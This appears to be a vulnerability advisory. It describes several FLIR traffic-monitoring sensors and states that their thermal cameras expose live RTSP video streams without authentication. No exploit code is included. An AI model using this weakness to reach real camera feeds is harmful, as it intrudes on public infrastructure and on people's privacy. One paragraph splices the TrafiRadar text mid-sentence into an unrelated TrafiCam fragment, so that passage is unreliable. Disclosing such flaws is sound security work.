Summary: FLIR TrafiOne is an all-round detection sensor for traffic monitoring
and dynamic traffic signal control. Offered in a compact and affordable
package, the FLIR TrafiOne uses thermal imaging and Wi-Fi technology to
adapt traffic signals based on the presence detection of vehicles, bicycles
and pedestrians while at the same time generating high resolution data at
intersections and in urban environments. FLIR TrafiOne helps traffic engineers
to improve traffic flows, reduce vehicle idling time, monitor congestion,
enhance safety for vulnerable road users, collect data and measure travel and
delay times for different transport modes.

FLIR TrafiCam is a vehicle presence sensor that combines a CMOS camera and a
video detector in a single unit. FLIR TrafiCam detects moving and stationary
vehicles at signalized intersections. Via detection outputs or via IP protocol,
vehicle presence information is transmitted to the traffic controller so that
signal timing can be adjusted dynamically. This way, vehicle waiting time at
traffic lights is reduced and traffic flows are optimized.

FLIR TrafiSense is an integrated thermal sensor and detector for vehicle and bike
detection. TrafiSense does not need light to operate, but uses the thermal energy
emitted from vehicles and bicyclists. This enables the sensor to detect vehicles
and bikes in the darkest of nights, over a long range and in the most difficult
weather conditions. The result is reliable, 24/7 traffic detection for a wide
range of applications.

FLIR TrafiRadar vehicle presence sensor is a combination of a video sensor and
radar. TrafiRadar is typically used for stop bar and advance vehicle presence
detection, traffic adaptive systems, and dilemma-zone protection and thus improves
traffic safety and efficiency at signalized intersections. TrafiRadar will warn
traffic light controllers whenever a vehicle is present in the dilemma zone, either
extending green or red lights to improve overall safety.and stationary vehicles at
signalized intersections and collect traffic data at intersections or interurban
roads. Via detection outputs or via IP protocol, vehicle presence information is
transmitted to the traffic controller so that signal timing can be adjusted
dynamically. TrafiCam x-stream offers streaming video at full frame rate, to be
used for traffic monitoring in a control room.

The VIP series offers multi-functional Video Image Processing modules for traffic
control. VIP boards integrate automatic incident detection, data collection,
recording of pre and post incident image sequences and streaming video in one
board. VIP modules have been installed for road and tunnel projects all over the
world.

Desc: FLIR thermal traffic cameras suffer from an unauthenticated and unauthorized
live RTSP video stream access.
